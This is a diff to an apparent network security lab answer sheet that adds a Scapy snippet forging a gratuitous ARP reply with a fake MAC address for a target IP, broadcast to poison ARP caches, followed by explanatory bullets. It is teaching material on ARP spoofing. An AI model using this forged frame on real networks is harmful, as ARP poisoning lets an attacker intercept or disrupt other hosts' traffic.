@@ -53,6 +53,14 @@ Write a Python code snippet (Scapy recommended) that sends a gratuitous ARP repl
 - A screenshot proving the ARP table was poisoned
 
 **Answer**: 
+```python
+ether = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
+arp = ARP(psrc  = IP_T, hwsrc = MAC_T_fake,
+          pdst  = IP_T, hwdst = "ff:ff:ff:ff:ff:ff")
+arp.op = 2  # Reply
+frame = ether/arp
+```
+
 - The source and destination IP addresses are the same, and they are the IP address of the host issuing the gratuitous ARP.
 - The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC address (`ff:ff:ff:ff:ff:ff`).
 - No reply is expected.
